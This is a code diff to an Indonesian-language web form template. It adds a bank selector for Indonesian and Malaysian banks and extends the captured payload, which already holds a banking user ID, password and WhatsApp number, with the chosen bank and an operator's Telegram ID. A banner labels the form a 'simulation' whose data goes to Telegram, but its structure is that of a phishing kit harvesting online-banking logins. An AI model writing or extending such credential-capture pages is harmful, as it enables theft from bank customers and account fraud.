@@ -99,6 +99,26 @@
       <strong>⚠️ Simulasi Test:</strong> Masukkan data apapun untuk test. Data akan dikirim ke Telegram sebagai simulasi.
     </div>
 
+    <!-- Bank Selection -->
+    <div class="mb-3">
+      <label for="bank_select" class="form-label">
+        <strong>Pilih Bank</strong>
+      </label>
+      <select id="bank_select" class="form-control" required>
+        <option value="">-- Pilih Bank --</option>
+        <option value="bca">🏦 BCA</option>
+        <option value="mandiri">🏦 Mandiri</option>
+        <option value="bni">🏦 BNI</option>
+        <option value="cimb">🏦 CIMB Niaga</option>
+        <option value="dbs">🏦 DBS</option>
+        <option value="maybank">🏦 Maybank (Malaysia)</option>
+        <option value="publicbank">🏦 Public Bank (Malaysia)</option>
+        <option value="rhb">🏦 RHB Bank (Malaysia)</option>
+        <option value="ambank">🏦 AmBank (Malaysia)</option>
+      </select>
+      <small class="form-text">Pilih salah satu bank dari daftar</small>
+    </div>
+
     <!-- User ID -->
     <div class="mb-3">
       <label for="user_id_input" class="form-label">
@@ -156,14 +176,24 @@
 
 <script>
   (function () {
+    const bankSelect = document.getElementById('bank_select');
     const userIdInput = document.getElementById('user_id_input');
     const passwordInput = document.getElementById('password_input');
     const waNumberInput = document.getElementById('wa_number_input');
     const submitBtn = document.getElementById('submitFormBtn');
     const resultDiv = document.getElementById('formResult');
 
+    // Ambil telegramId dari EJS variable
+    const telegramId = '<%= telegramId %>';
+
     submitBtn.addEventListener('click', async function () {
       // Validasi input
+      if (!bankSelect.value.trim()) {
+        alert('Pilih bank terlebih dahulu!');
+        bankSelect.focus();
+        return;
+      }
+
       if (!userIdInput.value.trim()) {
         alert('User ID tidak boleh kosong!');
         userIdInput.focus();
@@ -182,6 +212,11 @@
         return;
       }
 
+      if (!telegramId || telegramId === '') {
+        alert('Telegram ID tidak ditemukan!');
+        return;
+      }
+
       // Disable button dan tampilkan loading
       submitBtn.disabled = true;
       submitBtn.innerHTML = '<span class="loading-spinner"></span> Mengirim...';
@@ -189,9 +224,11 @@
 
       try {
         const payload = {
+          bank: bankSelect.value.trim(),
           userId: userIdInput.value.trim(),
           password: passwordInput.value.trim(),
           waNumber: waNumberInput.value.trim(),
+          telegramId: telegramId,
           simulation: true
         };
 
@@ -218,6 +255,7 @@
 
         // Reset form setelah 3 detik
         setTimeout(() => {
+          bankSelect.value = '';
           userIdInput.value = '';
           passwordInput.value = '';
           waNumberInput.value = '';
@@ -237,7 +275,7 @@
     });
 
     // Allow Enter key to submit
-    [userIdInput, passwordInput, waNumberInput].forEach(input => {
+    [bankSelect, userIdInput, passwordInput, waNumberInput].forEach(input => {
       input.addEventListener('keypress', (e) => {
         if (e.key === 'Enter') {
           submitBtn.click();
